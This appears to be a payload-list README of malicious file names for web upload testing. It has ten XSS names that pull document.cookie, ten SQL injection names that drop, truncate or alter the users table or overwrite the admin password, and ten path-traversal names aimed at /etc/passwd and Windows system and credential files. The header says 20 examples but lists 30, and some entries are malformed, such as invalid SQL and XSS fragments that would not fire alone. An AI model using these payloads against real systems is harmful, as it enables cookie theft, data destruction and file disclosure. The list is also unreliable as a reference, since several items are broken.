# Filename-Payloads
Filename Vulbs
Here are 20 examples of filename vulnerabilities:

*Filename XSS*

1. `<script>alert(document.cookie)</script>.jpg`
2. `<iframe src="javascript:alert(document.cookie)"></iframe>.jpg`
3. `onload=alert(document.cookie)>.jpg`
4. `onerror=alert(document.cookie)>.jpg`
5. `onmouseover=alert(document.cookie)>.jpg`
6. `onmouseout=alert(document.cookie)>.jpg`
7. `onmousemove=alert(document.cookie)>.jpg`
8. `onkeydown=alert(document.cookie)>.jpg`
9. `onkeyup=alert(document.cookie)>.jpg`
10. `onkeypress=alert(document.cookie)>.jpg`

*Filename SQLi*

1. `'; DROP TABLE users; --.jpg`
2. `'; SELECT * FROM users; --.jpg`
3. `'; UPDATE users SET password = 'password' WHERE username = 'admin'; --.jpg`
4. `'; DELETE FROM users WHERE username = 'admin'; --.jpg`
5. `'; INSERT INTO users (username, password) VALUES ('admin', 'password'); --.jpg`
6. `'; CREATE TABLE users (username VARCHAR(255), password VARCHAR(255)); --.jpg`
7. `'; ALTER TABLE users ADD COLUMN email VARCHAR(255); --.jpg`
8. `'; DROP COLUMN email FROM users; --.jpg`
9. `'; RENAME TABLE users TO new_users; --.jpg`
10. `'; TRUNCATE TABLE users; --.jpg`

*Filename Path Traversal*

1. `../../../../etc/passwd`
2. `../../../../boot.ini`
3. `../../../../windows/system32/config/system`
4. `../../../../Program Files/Microsoft Office/Office12/WINWORD.EXE`
5. `../../../../Program Files/Adobe/Photoshop/Photoshop.exe`
6. `../../../../Program Files/Mozilla Firefox/firefox.exe`
7. `../../../../Program Files/Google Chrome/Chrome.exe`
8. `../../../../Program Files/Internet Explorer/iexplore.exe`
9. `../../../../Program Files/Opera/opera.exe`
10. `../../../../Program Files/Safari/Safari.exe`
